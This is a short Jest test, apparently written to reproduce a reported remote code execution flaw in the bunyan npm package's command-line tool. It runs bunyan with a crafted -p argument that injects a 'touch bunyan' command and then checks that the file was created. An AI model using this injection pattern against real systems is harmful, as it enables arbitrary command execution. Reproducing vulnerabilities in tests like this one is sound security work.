//https://hackerone.com/reports/902739
test("Remote code execution in bunyan", (done) => {
  expect.assertions(2);
  const { exec } = require("child_process");
  const fs = require("fs");
  const path = "./bunyan";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_string = `./node_modules/bunyan/bin/bunyan -p "S'11;touch bunyan;'"`;
  try {
    exec(attack_string, (error, stdout) => {
      // if(error)console.log(error);
      sleep.sleep(3);
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      // fs.unlink(path, function (err) {
      //     done();
      // });
      done();
    });
  } catch (error) {
    // console.log(error);
  }
});
